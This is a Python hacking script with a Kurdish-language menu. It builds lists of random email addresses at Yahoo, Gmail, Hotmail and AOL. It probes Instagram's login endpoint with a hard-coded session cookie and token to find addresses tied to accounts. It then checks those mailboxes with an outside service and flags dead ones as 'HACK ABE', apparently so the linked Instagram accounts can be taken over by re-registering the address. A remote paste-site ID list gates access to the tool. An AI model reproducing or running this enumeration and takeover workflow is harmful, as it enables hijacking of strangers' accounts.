import requests
import time
import os
import random
import sys

#FA7SE EMIL DONE
#LOGIN TAWAWA
#EMIL HENA TAWAW
# FA7S INSTA TAWAW
def ya():
    file=open("zamo.txt","w")
    os.system('clear')
    name=input("NAME :")
    url=int(input("CHAND EMIL BE :"))
    for x in range(url):
        num='123456789056720938574193458185665919267685483929011101102929384847556'
        a1=random.choice(num)
        a2=random.choice(num)
        a3=random.choice(num)
        ani=name+a1+a2+a3+"@yahoo.com"
        print(ani)
        file.write(ani+"\n")






def gm():
    file=open("zamo.txt","w")
    os.system('clear')
    name=input("NAME :")
    url=int(input("CHAND EMIL BE :"))
    for x in range(url):
        num='123456789056720938574193458185665919267685483929011101102929384847556'
        a1=random.choice(num)
        a2=random.choice(num)
        a3=random.choice(num)
        ani=name+a1+a2+a3+"@gmail.com"
        file.write(ani+"\n")











def ho():
    file=open("zamo.txt","w")
    os.system('clear')
    name=input("NAME :")
    url=int(input("CHAND EMIL BE :"))
    for x in range(url):
        num='123456789056720938574193458185665919267685483929011101102929384847556'
        a1=random.choice(num)
        a2=random.choice(num)
        a3=random.choice(num)
        ani=name+a1+a2+a3+"@hotmail.com"
        print(ani)
        file.write(ani+"\n")









def chek():
    os.system('clear')
    os.system('xdg-open https://tools1s.com/hotmail/')
    a=input("ENTER\n")







def chek2():
    os.system("clear")
    emil=input("EMIL :")
    url="https://mmo69.com/_check_live_email/api.php?email="+emil
    chk=requests.get(url)
    a=chk.text
    if "DIE" in chk.text:
        print(emil+" \nHACK ABE")





def aol():
    file=open("zamo.txt","w")
    os.system('clear')
    name=input("NAME :")
    url=int(input("CHAND EMIL BE :"))
    for x in range(url):
        num='123456789056720938574193458185665919267685483929011101102929384847556'
        a1=random.choice(num)
        a2=random.choice(num)
        a3=random.choice(num)
        ani=name+a1+a2+a3+"@aol.com"
        file.write(ani+"\n")




def instacheker():
    os.system('clear')
    ani= """\033[0;31m  
    
 ______                     
|___  /                     
   / / __ _ _ __ ___   ___  
  / / / _` | '_ ` _ \ / _ \ 
 / /_| (_| | | | | | | (_) |
/_____\__,_|_| |_| |_|\___/ 
                            
\033[0;37m
    """
    print(ani)
    print("====================================")
    file= input("File Email : ")
    filer = open(file, 'r').readlines()
    head = {
    'accept':'*/*',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8',
    'content-length':'270',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'ig_cb=1; ig_did=BF4465A9-017D-4668-B5C3-EBD3DA65B2A6; csrftoken=b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC; rur=ASH; mid=XzHZAQALAAEagshAZoRCgkUeXmJP',
    'origin':'https://www.instagram.com',
    'referer':'https://www.instagram.com/',
    'sec-fetch-dest':'empty',
    'sec-fetch-mode':'cors',
    'sec-fetch-site':'same-origin',
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
    'x-csrftoken':'b8kQhInVzG8P5hvZwlxD38EjOrMfqxkC',
    'x-ig-app-id':'936619743392459',
    'x-ig-www-claim':'0',
    'x-instagram-ajax':'a9aec8fa634f',
    'x-requested-with':'XMLHttpRequest'
  }
    url = "https://www.instagram.com/accounts/login/ajax/"
    for lines in filer:
        uin = lines.strip()
        payload = {                         
    'username' : uin,
    'enc_password':'Admin123123',
    'queryParams': '{}',
    'optIntoOneTap': 'false'
    }
        http = requests.post(url, data=payload, headers=head).text
        if '"user": true' in http:
            print(" ")
            a=(uin)
            print(uin)
    ani=input("ENTER")

def danyar():
        os.system('clear')
        logo="""\033[0;34m
    _   _   _   _  
 / \ / \ / \ / \ 
( Z | a | m | o )
 \_/ \_/ \_/ \_/             
       
        """
     
        
        print("\n")
        print(logo)
        print("PEWESTA TO SARATA EMIL BENE DWATR FA7SE INSTAGRAM KAY DWATR FA7S EMIL")
        print("================")
        print("1.BO HENANE EMIL")
        print("================")
        print("2.BO FA7S KRDNE INSTAGRAM")
        print("================")
        print("3.BO FA7S KRDNE EMIL")
        print("================")
        kamyan=int(input("KAMYAN : "))
        if kamyan==1:
            os.system('clear')
            print("1.YAHOO")
            print("======")
            print("2.GMAIL")
            print("======")
            print("3.HOTMAIL")
            print("========")
            print("4.AOL")
            print("========")
            print("\n")
            ka=int(input("KAMYAN :"))
            if ka==1:
                ya()
                danyar()
            elif ka==2:
                gm()
                danyar()
            
            elif ka==3:
                ho()
                danyar()
            elif ka==4:
                aol()
                danyar()
        elif kamyan==2:
            instacheker()
            danyar()
        
        elif kamyan==3:
            os.system('clear')
            print("1.BA DANA")
            print("========")
            print("2.BA KOMAL")
            print("========")
            print("\n")
            a=int(input("KAMYAN :"))
            if a==1:
                chek2()
                danyar()
            elif a==2:
                chek()
                danyar()
            
            
def baha():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    print("\x1b[37;1mYour ID : "+id)
    try:
        httpCaht = requests.get("https://textuploader.com/1eb01/raw").text
        if id in httpCaht:
            print("\x1b[37;1mYOUR ID IS ACTIVE.........")
            msg = str(os.geteuid())
            time.sleep(1)
            danyar()
            
        else:
            print("\x1b[37;1mYOUR ID IS NOT ACTIVE.........")
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()

    if name == '__main__':
        baha()

os.system('xdg-open https://www.instagram.com/1zamo1/')
os.system('clear')





baha()


            
danyar()

